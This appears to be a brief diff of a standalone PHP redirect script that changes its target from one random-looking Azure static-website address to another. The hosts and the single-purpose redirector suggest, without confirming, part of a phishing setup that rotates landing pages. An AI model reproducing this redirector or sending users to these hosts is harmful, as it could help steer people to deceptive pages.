@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://mixeddcoreuiisd2.z5.web.core.windows.net/");
+header("Location: https://mas8core88xxx.z8.web.core.windows.net/");
  
 exit;
 ?>
